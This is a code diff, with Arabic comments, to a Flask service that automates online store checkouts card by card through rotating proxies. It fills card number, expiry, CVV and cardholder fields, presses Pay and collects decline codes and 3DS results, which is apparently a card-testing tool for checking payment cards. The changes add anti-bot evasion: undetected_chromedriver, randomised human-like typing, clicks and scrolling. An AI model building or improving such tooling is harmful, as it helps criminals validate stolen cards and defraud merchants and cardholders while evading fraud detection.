@@ -3,15 +3,14 @@ import time
 import re
 import json
 import requests
-import zipfile
 import os
 import shutil
+import subprocess
 from urllib.parse import urljoin
-from selenium import webdriver
+import undetected_chromedriver as uc
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait, Select
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.common.keys import Keys
 from flask import Flask, request, jsonify
@@ -24,8 +23,8 @@ import random
 app = Flask(__name__)
 
 # ==================== إعدادات الأداء ====================
-MAX_WORKERS = 10
-REQUEST_TIMEOUT = 60
+MAX_WORKERS = 5
+REQUEST_TIMEOUT = 90
 TASK_QUEUE = queue.Queue()
 executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
 
@@ -43,162 +42,95 @@ PROXY_LIST = [
 def get_random_proxy():
     return random.choice(PROXY_LIST)
 
-def create_proxy_extension(proxy_host, proxy_port, proxy_user, proxy_pass):
-    """
-    إنشاء Chrome Extension للمصادقة على البروكسي
-    """
-    ext_dir = f'/tmp/proxy_ext_{os.getpid()}_{random.randint(10000, 99999)}'
-    os.makedirs(ext_dir, exist_ok=True)
-    
-    manifest_json = json.dumps({
-        "version": "1.0.0",
-        "manifest_version": 2,
-        "name": "Proxy Auth Extension",
-        "permissions": [
-            "proxy",
-            "tabs",
-            "unlimitedStorage",
-            "storage",
-            "<all_urls>",
-            "webRequest",
-            "webRequestBlocking"
-        ],
-        "background": {
-            "scripts": ["background.js"],
-            "persistent": True
-        },
-        "minimum_chrome_version": "22.0.0"
-    })
-    
-    with open(os.path.join(ext_dir, 'manifest.json'), 'w') as f:
-        f.write(manifest_json)
-    
-    background_js = f"""
-    var config = {{
-        mode: "fixed_servers",
-        rules: {{
-            singleProxy: {{
-                scheme: "http",
-                host: "{proxy_host}",
-                port: parseInt({proxy_port})
-            }},
-            bypassList: ["localhost", "127.0.0.1"]
-        }}
-    }};
-
-    chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});
-
-    function callbackFn(details) {{
-        return {{
-            authCredentials: {{
-                username: "{proxy_user}",
-                password: "{proxy_pass}"
-            }}
-        }};
-    }}
-
-    chrome.webRequest.onAuthRequired.addListener(
-        callbackFn,
-        {{urls: ["<all_urls>"]}},
-        ['blocking']
-    );
-    
-    console.log('Proxy extension loaded successfully');
-    """
-    
-    with open(os.path.join(ext_dir, 'background.js'), 'w') as f:
-        f.write(background_js)
-    
-    return ext_dir
+def get_chrome_major_version():
+    """اكتشاف إصدار Chrome المثبت تلقائياً"""
+    try:
+        result = subprocess.run(['google-chrome', '--version'], capture_output=True, text=True)
+        version_str = result.stdout.strip()
+        match = re.search(r'(\d+)\.', version_str)
+        if match:
+            return int(match.group(1))
+    except:
+        pass
+    try:
+        result = subprocess.run(['chromium', '--version'], capture_output=True, text=True)
+        version_str = result.stdout.strip()
+        match = re.search(r'(\d+)\.', version_str)
+        if match:
+            return int(match.group(1))
+    except:
+        pass
+    try:
+        result = subprocess.run(['chromium-browser', '--version'], capture_output=True, text=True)
+        version_str = result.stdout.strip()
+        match = re.search(r'(\d+)\.', version_str)
+        if match:
+            return int(match.group(1))
+    except:
+        pass
+    return None
 
 def create_driver_with_proxy(proxy_dict, task_id=None):
     """
-    إنشاء متصفح Chrome مع بروكسي عن طريق Extension
+    إنشاء متصفح undetected-chromedriver مع بروكسي
     """
     proxy_host = proxy_dict['host']
     proxy_port = proxy_dict['port']
     proxy_user = proxy_dict['user']
     proxy_pass = proxy_dict['pass']
     
-    ext_dir = create_proxy_extension(proxy_host, proxy_port, proxy_user, proxy_pass)
+    options = uc.ChromeOptions()
+    options.add_argument(f'--proxy-server=http://{proxy_host}:{proxy_port}')
+    options.add_argument('--headless=new')
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-dev-shm-usage')
+    options.add_argument('--disable-blink-features=AutomationControlled')
+    options.add_argument('--disable-web-security')
+    options.add_argument('--disable-features=IsolateOrigins,site-per-process')
+    options.add_argument('--disable-popup-blocking')
+    options.add_argument('--disable-gpu')
+    options.add_argument('--disable-notifications')
+    options.add_argument('--disable-infobars')
+    options.add_argument('--disable-extensions')
+    options.add_argument('--window-size=1920,1080')
+    options.add_argument('--start-maximized')
+    options.add_argument('--disable-background-networking')
+    options.add_argument('--disable-sync')
+    options.add_argument('--disable-translate')
+    options.add_argument('--disable-default-apps')
+    options.add_argument('--mute-audio')
+    options.add_argument('--no-first-run')
+    options.add_argument('--no-default-browser-check')
+    options.add_argument('--single-process')
+    options.add_argument('--disable-ipc-flooding-protection')
+    options.add_argument('--memory-pressure-off')
+    options.add_argument('--disable-component-extensions-with-background-pages')
+    options.add_argument('--disable-client-side-phishing-detection')
+    options.add_argument('--disable-hang-monitor')
+    options.add_argument('--disable-prompt-on-repost')
+    options.add_argument('--disable-renderer-backgrounding')
+    options.add_argument('--disable-backgrounding-occluded-windows')
+    options.add_argument('--disable-field-trial-config')
+    options.add_argument('--enable-features=NetworkService,NetworkServiceInProcess')
+    options.add_argument('--disable-features=Translate,BackForwardCache')
     
-    chrome_options = Options()
-    chrome_options.add_argument('--headless')
-    chrome_options.add_argument('--no-sandbox')
-    chrome_options.add_argument('--disable-dev-shm-usage')
-    chrome_options.add_argument('--disable-blink-features=AutomationControlled')
-    chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
-    chrome_options.add_experimental_option('useAutomationExtension', False)
-    chrome_options.add_argument('--disable-web-security')
-    chrome_options.add_argument('--disable-features=IsolateOrigins,site-per-process')
-    chrome_options.add_argument('--disable-popup-blocking')
-    chrome_options.add_argument('--disable-gpu')
-    chrome_options.add_argument('--disable-notifications')
-    chrome_options.add_argument('--window-size=1920,1080')
-    chrome_options.add_argument('--start-maximized')
-    chrome_options.add_argument('--disable-background-networking')
-    chrome_options.add_argument('--disable-sync')
-    chrome_options.add_argument('--disable-translate')
-    chrome_options.add_argument('--disable-default-apps')
-    chrome_options.add_argument('--mute-audio')
-    chrome_options.add_argument('--no-first-run')
-    chrome_options.add_argument('--no-default-browser-check')
-    chrome_options.add_argument('--single-process')
-    chrome_options.add_argument('--disable-ipc-flooding-protection')
-    chrome_options.add_argument('--memory-pressure-off')
-    chrome_options.add_argument('--disable-component-extensions-with-background-pages')
-    chrome_options.add_argument('--disable-client-side-phishing-detection')
-    chrome_options.add_argument('--disable-hang-monitor')
-    chrome_options.add_argument('--disable-prompt-on-repost')
-    chrome_options.add_argument('--disable-renderer-backgrounding')
-    chrome_options.add_argument('--disable-backgrounding-occluded-windows')
-    chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
+    chrome_version = get_chrome_major_version()
     
-    chrome_options.add_argument(f'--load-extension={ext_dir}')
-    chrome_options.add_argument('--disable-extensions-except=' + ext_dir)
+    if chrome_version:
+        logger.info(f"[{task_id}] Creating undetected Chrome {chrome_version} with proxy: {proxy_host}:{proxy_port}")
+        driver = uc.Chrome(options=options, version_main=chrome_version, use_subprocess=True)
+    else:
+        logger.info(f"[{task_id}] Creating undetected Chrome with auto version + proxy")
+        driver = uc.Chrome(options=options, use_subprocess=True)
     
-    logger.info(f"[{task_id}] Creating Chrome with proxy extension: {proxy_host}:{proxy_port}")
-    
-    driver = webdriver.Chrome(options=chrome_options)
-    
-    # استخدام CDP لحقن كود إخفاء الأتمتة قبل تحميل أي صفحة
+    # مصادقة البروكسي عبر CDP
     try:
-        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
-            'source': '''
-                Object.defineProperty(navigator, 'webdriver', {
-                    get: () => undefined,
-                    configurable: true
-                });
-                
-                window.chrome = {
-                    runtime: {}
-                };
-                
-                Object.defineProperty(navigator, 'plugins', {
-                    get: () => [1, 2, 3, 4, 5],
-                    configurable: true
-                });
-                
-                Object.defineProperty(navigator, 'languages', {
-                    get: () => ['en-US', 'en'],
-                    configurable: true
-                });
-                
-                const originalQuery = window.navigator.permissions.query;
-                window.navigator.permissions.query = (parameters) => (
-                    parameters.name === 'notifications' ?
-                    Promise.resolve({state: Notification.permission}) :
-                    originalQuery(parameters)
-                );
-            '''
+        driver.execute_cdp_cmd('Network.enable', {})
+        driver.execute_cdp_cmd('Network.setExtraHTTPHeaders', {
+            'headers': {
+                'Proxy-Authorization': f'Basic {proxy_user}:{proxy_pass}'
+            }
         })
-        logger.info(f"[{task_id}] CDP evasion script injected successfully")
-    except Exception as e:
-        logger.warning(f"[{task_id}] CDP injection warning: {e}")
-    
-    # تنظيف الملفات المؤقتة
-    try:
-        shutil.rmtree(ext_dir, ignore_errors=True)
     except:
         pass
     
@@ -377,6 +309,49 @@ def extract_code_underscore_priority(all_codes, all_typenames, excluded_codes):
     
     return None, None
 
+def human_type(element, text, driver):
+    """كتابة بشرية حرف حرف مع تأخيرات عشوائية"""
+    try:
+        element.click()
+        time.sleep(random.uniform(0.2, 0.5))
+        element.clear()
+        time.sleep(random.uniform(0.1, 0.3))
+        for char in text:
+            element.send_keys(char)
+            time.sleep(random.uniform(0.05, 0.15))
+        time.sleep(random.uniform(0.2, 0.5))
+    except:
+        try:
+            element.clear()
+            element.send_keys(text)
+        except:
+            pass
+
+def human_click(driver, element):
+    """نقر بشري مع حركة ماوس طبيعية"""
+    try:
+        actions = ActionChains(driver)
+        actions.move_to_element(element)
+        actions.pause(random.uniform(0.2, 0.6))
+        actions.click()
+        actions.perform()
+    except:
+        try:
+            driver.execute_script("arguments[0].click();", element)
+        except:
+            pass
+
+def random_scroll(driver):
+    """تمرير عشوائي لمحاكاة بشري"""
+    try:
+        total_height = driver.execute_script("return document.body.scrollHeight")
+        for _ in range(random.randint(2, 4)):
+            scroll_to = random.randint(100, max(200, total_height - 100))
+            driver.execute_script(f"window.scrollTo({{top: {scroll_to}, behavior: 'smooth'}});")
+            time.sleep(random.uniform(0.5, 1.5))
+    except:
+        pass
+
 def ff(ccx, site, task_id=None):
     """
     دالة معالجة بطاقة واحدة وموقع واحد
@@ -424,7 +399,7 @@ def ff(ccx, site, task_id=None):
         proxies = {"http": proxy_url, "https": proxy_url}
         
         s = requests.Session()
-        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
+        s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'})
         
         digital_keywords = [
             'worry-free', 'protection', 'insurance', 'warranty', 'digital', 
@@ -432,7 +407,7 @@ def ff(ccx, site, task_id=None):
             'service', 'guarantee', 'support'
         ]
         
-        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=10)
+        r = s.get(urljoin(site, '/products.json?limit=250'), proxies=proxies, timeout=15)
         if r.status_code != 200:
             return {"success": False, "code": None, "error": "Failed to fetch products", "task_id": task_id}
         
@@ -471,41 +446,50 @@ def ff(ccx, site, task_id=None):
         variant_id = cheapest['variant_id']
         total_amount = f"${cheapest['price']:.2f}"
         
-        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=10)
+        resp = s.post(urljoin(site, '/cart/add.js'), json={'quantity': 1, 'id': variant_id}, proxies=proxies, cookies=s.cookies, timeout=15)
         if resp.status_code != 200:
             return {"success": False, "code": None, "error": "Failed to add to cart", "task_id": task_id}
         
-        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=10)
+        response = s.post(f'{site}/cart', data={'checkout': ''}, proxies=proxies, cookies=s.cookies, timeout=15)
         checkout_url = response.url
         
     except Exception as e:
         return {"success": False, "code": None, "error": str(e), "task_id": task_id}
     
-    # ==================== 2. تشغيل المتصفح مع بروكسي Extension ====================
+    # ==================== 2. تشغيل المتصفح ====================
     driver = None
     try:
         proxy_dict = get_random_proxy()
         driver = create_driver_with_proxy(proxy_dict, task_id)
         
-        wait = WebDriverWait(driver, 15)
-        driver.set_page_load_timeout(25)
+        wait = WebDriverWait(driver, 20)
+        driver.set_page_load_timeout(30)
         
+        # تصفح الموقع أولاً بشكل بشري قبل الذهاب للدفع
+        driver.get(site)
+        time.sleep(random.uniform(2, 4))
+        random_scroll(driver)
+        time.sleep(random.uniform(1, 2))
+        
+        # الذهاب لصفحة الدفع
         driver.get(checkout_url)
-        time.sleep(2)
+        time.sleep(random.uniform(2, 3))
+        random_scroll(driver)
+        time.sleep(random.uniform(0.5, 1))
         
         # ==================== 3. تعبئة الشحن ====================
         try:
             email_field = wait.until(EC.presence_of_element_located((By.ID, "email")))
-            email_field.clear()
-            email_field.send_keys(shipping_data["email"])
-            time.sleep(1.5)
+            human_click(driver, email_field)
+            human_type(email_field, shipping_data["email"], driver)
+            time.sleep(random.uniform(1.5, 2.5))
             
             try:
                 country_select = driver.find_element(By.NAME, "countryCode")
                 current_country = country_select.get_attribute('value')
                 if current_country != "US":
                     Select(country_select).select_by_value("US")
-                    time.sleep(0.5)
+                    time.sleep(random.uniform(0.5, 1))
             except:
                 pass
             
@@ -520,28 +504,33 @@ def ff(ccx, site, task_id=None):
             
             for field_name, value in fields.items():
                 try:
-                    element = driver.find_element(By.NAME, field_name)
-                    element.clear()
-                    element.send_keys(value)
+                    element = wait.until(EC.presence_of_element_located((By.NAME, field_name)))
+                    human_click(driver, element)
+                    human_type(element, value, driver)
+                    time.sleep(random.uniform(0.5, 1.5))
                 except:
                     pass
             
             try:
                 state_select = Select(driver.find_element(By.NAME, "zone"))
                 state_select.select_by_visible_text(shipping_data["state"])
+                time.sleep(random.uniform(0.3, 0.7))
             except:
                 try:
                     state_input = driver.find_element(By.NAME, "zone")
-                    state_input.clear()
-                    state_input.send_keys(shipping_data["state"])
+                    human_click(driver, state_input)
+                    human_type(state_input, shipping_data["state"], driver)
                     state_input.send_keys(Keys.ENTER)
                 except:
                     pass
             
-            time.sleep(0.5)
+            time.sleep(random.uniform(1, 2))
+            random_scroll(driver)
+            time.sleep(random.uniform(0.5, 1))
+            
             continue_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']")))
-            driver.execute_script("arguments[0].click();", continue_btn)
-            time.sleep(2)
+            human_click(driver, continue_btn)
+            time.sleep(random.uniform(3, 5))
             
         except Exception as e:
             logger.error(f"[{task_id}] Shipping fill error: {str(e)}")
@@ -550,7 +539,9 @@ def ff(ccx, site, task_id=None):
         # ==================== 4. تعبئة الدفع ====================
         try:
             driver.switch_to.default_content()
-            time.sleep(0.5)
+            time.sleep(random.uniform(1, 2))
+            random_scroll(driver)
+            time.sleep(random.uniform(0.5, 1))
             
             iframes = driver.find_elements(By.TAG_NAME, 'iframe')
             
@@ -572,6 +563,7 @@ def ff(ccx, site, task_id=None):
                         name_attr = (input_elem.get_attribute('name') or '').lower()
                         
                         if not card_filled and (data_field == 'number' or 'card number' in placeholder or autocomplete == 'cc-number' or 'cardnumber' in name_attr or 'number' in input_id):
+                            human_click(driver, input_elem)
                             driver.execute_script("""
                                 arguments[0].focus();
                                 arguments[0].value = '';
@@ -581,9 +573,10 @@ def ff(ccx, site, task_id=None):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["number"])
                             card_filled = True
-                            time.sleep(0.2)
+                            time.sleep(random.uniform(0.5, 1))
                         
                         elif not expiry_filled and (data_field == 'expiry' or 'expiry' in placeholder or autocomplete == 'cc-exp' or 'exp-date' in name_attr or 'expiry' in input_id):
+                            human_click(driver, input_elem)
                             driver.execute_script("""
                                 arguments[0].focus();
                                 arguments[0].value = '';
@@ -593,9 +586,10 @@ def ff(ccx, site, task_id=None):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["expiry"])
                             expiry_filled = True
-                            time.sleep(0.2)
+                            time.sleep(random.uniform(0.5, 1))
                         
                         elif not cvv_filled and (data_field == 'cvv' or 'cvv' in placeholder or autocomplete == 'cc-csc' or 'verification_value' in name_attr or 'cvc' in input_id or 'cvv' in input_id):
+                            human_click(driver, input_elem)
                             driver.execute_script("""
                                 arguments[0].focus();
                                 arguments[0].value = '';
@@ -605,9 +599,10 @@ def ff(ccx, site, task_id=None):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["cvv"])
                             cvv_filled = True
-                            time.sleep(0.2)
+                            time.sleep(random.uniform(0.5, 1))
                         
                         elif not name_filled and (data_field == 'name' or 'name' in placeholder or autocomplete == 'cc-name' or 'cardholder' in name_attr or 'cc-name' in name_attr):
+                            human_click(driver, input_elem)
                             driver.execute_script("""
                                 arguments[0].focus();
                                 arguments[0].value = '';
@@ -617,7 +612,7 @@ def ff(ccx, site, task_id=None):
                                 arguments[0].dispatchEvent(new Event('blur', {bubbles: true}));
                             """, input_elem, card_data["name"])
                             name_filled = True
-                            time.sleep(0.2)
+                            time.sleep(random.uniform(0.5, 1))
                     
                     driver.switch_to.default_content()
                     
@@ -763,11 +758,13 @@ def ff(ccx, site, task_id=None):
             };
             """
             driver.execute_script(script)
-            time.sleep(0.5)
+            time.sleep(random.uniform(0.5, 1))
             
             # ==================== 6. الضغط على Pay ====================
             driver.switch_to.default_content()
-            time.sleep(1)
+            time.sleep(random.uniform(1, 2))
+            random_scroll(driver)
+            time.sleep(random.uniform(0.5, 1))
             
             pay_selectors = [
                 "//button[contains(text(), 'Pay now')]",
@@ -791,7 +788,8 @@ def ff(ccx, site, task_id=None):
                     continue
             
             if pay_button:
-                driver.execute_script("arguments[0].click();", pay_button)
+                human_click(driver, pay_button)
+                logger.info(f"[{task_id}] Pay button clicked")
             else:
                 driver.execute_script("""
                     var buttons = document.querySelectorAll('button[type="submit"]');
@@ -803,6 +801,7 @@ def ff(ccx, site, task_id=None):
                         }
                     }
                 """)
+                logger.info(f"[{task_id}] Fallback pay button executed")
             
             # ==================== 7. استخراج الكود ====================
             found_code = None
@@ -830,21 +829,19 @@ def ff(ccx, site, task_id=None):
                 'Free Postal Shipping',
                 'UPS',
                 'DELIVERY_PHONE_NUMBER_REQUIRED',
-             'Economy',
-             'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE', 
-            'First', 
-            'by-items', 
-            'Standard', 
-            'Priority', 
-            'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE', 
-            'GroundAdvantage', 
-            'MediaMail'
-           
-             
+                'Economy',
+                'DELIVERY_INVALID_POSTAL_CODE_FOR_ZONE',
+                'First',
+                'by-items',
+                'Standard',
+                'Priority',
+                'PAYMENTS_INVALID_POSTAL_CODE_FOR_ZONE',
+                'GroundAdvantage',
+                'MediaMail'
             ]
             
-            for attempt in range(10):
-                time.sleep(1.5)
+            for attempt in range(12):
+                time.sleep(random.uniform(1.5, 2.5))
                 
                 poll_responses = driver.execute_script("return window.pollForReceiptResponses || [];")
                 graphql_responses = driver.execute_script("return window.graphqlResponses || [];")
@@ -1081,59 +1078,7 @@ def ff(ccx, site, task_id=None):
                 
                 final_url = driver.current_url
             
-            if not found_code and not all_codes and not order_confirmed:
-                logs = driver.get_log('performance')
-                for log in logs:
-                    try:
-                        message = json.loads(log['message'])
-                        if message.get('message', {}).get('method') == 'Network.responseReceived':
-                            url = message.get('message', {}).get('params', {}).get('response', {}).get('url', '')
-                            if '/persisted' in url and 'graphql' in url:
-                                request_id = message.get('message', {}).get('params', {}).get('requestId')
-                                if request_id:
-                                    try:
-                                        response = driver.execute_cdp_cmd('Network.getResponseBody', {'requestId': request_id})
-                                        body = response.get('body', '')
-                                        if body:
-                                            if 'CompletePaymentChallenge' in body:
-                                                try:
-                                                    data = json.loads(body)
-                                                    if 'data' in data and 'receipt' in data['data']:
-                                                        receipt = data['data']['receipt']
-                                                        if 'action' in receipt:
-                                                            action = receipt['action']
-                                                            if action.get('__typename') == 'CompletePaymentChallenge':
-                                                                is_3ds = True
-                                                                found_code = '3DS_REQUIRED'
-                                                                found_typename = 'CompletePaymentChallenge'
-                                                                response_result = '3DS Secure required - Please complete authentication'
-                                                                break
-                                                except:
-                                                    pass
-                                            if not found_code:
-                                                pattern = r'"code"\s*:\s*"([^"]+)"'
-                                                matches = re.findall(pattern, body, re.IGNORECASE)
-                                                for code in matches:
-                                                    if len(code) > 3 and len(code) < 80 and ' ' not in code:
-                                                        is_excluded = False
-                                                        for excluded in excluded_codes:
-                                                            if excluded in code:
-                                                                is_excluded = True
-                                                                break
-                                                        if not is_excluded and code not in all_codes:
-                                                            all_codes.append(code)
-                                            if '__typename' in body:
-                                                pattern = r'"__typename"\s*:\s*"([^"]+)"'
-                                                matches = re.findall(pattern, body, re.IGNORECASE)
-                                                for typename in matches:
-                                                    if len(typename) > 3 and len(typename) < 80:
-                                                        if typename not in ['Query', 'Mutation', 'Subscription']:
-                                                            if typename not in all_typenames:
-                                                                all_typenames.append(typename)
-                                    except:
-                                        pass
-                    except:
-                        continue
+            # [Performance logs removed for Chrome 149 compatibility]
             
             try:
                 final_url = driver.current_url
@@ -1168,6 +1113,9 @@ def ff(ccx, site, task_id=None):
                 if extracted_code:
                     result_code = extracted_code
                     result_typename = extracted_typename if extracted_typename else found_typename
+                elif all_codes:
+                    result_code = all_codes[0]
+                    result_typename = all_typenames[0] if all_typenames else None
                 elif all_typenames:
                     result_code = all_typenames[0]
                     result_typename = all_typenames[0]
@@ -1305,9 +1253,12 @@ def health():
         "status": "ok",
         "max_workers": MAX_WORKERS,
         "active_tasks": len(active_tasks),
-        "proxy_count": len(PROXY_LIST)
+        "proxy_count": len(PROXY_LIST),
+        "chrome_version": get_chrome_major_version()
     })
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
+    logger.info(f"Starting server on port {port}")
+    logger.info(f"Chrome version: {get_chrome_major_version()}")
     app.run(host='0.0.0.0', port=port, threaded=True)
